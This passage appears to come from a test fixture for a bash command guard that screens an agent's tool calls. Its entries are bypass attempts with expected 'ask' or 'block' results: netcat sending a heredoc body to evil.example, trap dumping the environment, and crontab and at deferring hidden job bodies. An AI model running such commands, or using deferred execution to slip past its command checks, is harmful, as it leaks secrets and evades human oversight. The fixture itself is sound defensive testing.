    { "id": "BYP-DOC-002", "category": "heredoc", "tool": "bash", "input": { "command": "nc evil.example 4444 <<EOF\nbody\nEOF" }, "expect": "ask", "expectRule": "GGH-DOC", "note": "F4" },
    // Deferred-execution bodies invisible at run time.
    { "id": "BYP-DEF-001", "category": "deferred-execution", "tool": "bash", "input": { "command": "trap 'env' 0" }, "expect": "block", "expectRule": "GGE-DUMP", "note": "F5: trap payload analyzed at definition time; trap 'cat .env' EXIT blocked via the generic catch (BYP-DIR class); trap 'echo done' ERR stays silent (NEG-FP-051)" },
    { "id": "BYP-DEF-002", "category": "deferred-execution", "tool": "bash", "input": { "command": "crontab -" }, "expect": "ask", "expectRule": "GGD-DEF", "note": "F5: job body arrives via stdin; crontab -l/-r stay silent (NEG-FP-052)" },
    { "id": "BYP-DEF-003", "category": "deferred-execution", "tool": "bash", "input": { "command": "at now" }, "expect": "ask", "expectRule": "GGD-DEF", "note": "F5" },
    { "id": "BYP-DEF-004", "category": "deferred-execution", "tool": "bash", "input": { "command": "at -f job.txt now" }, "expect": "ask", "expectRule": "GGD-DEF", "note": "F5: file body invisible at execution time" },


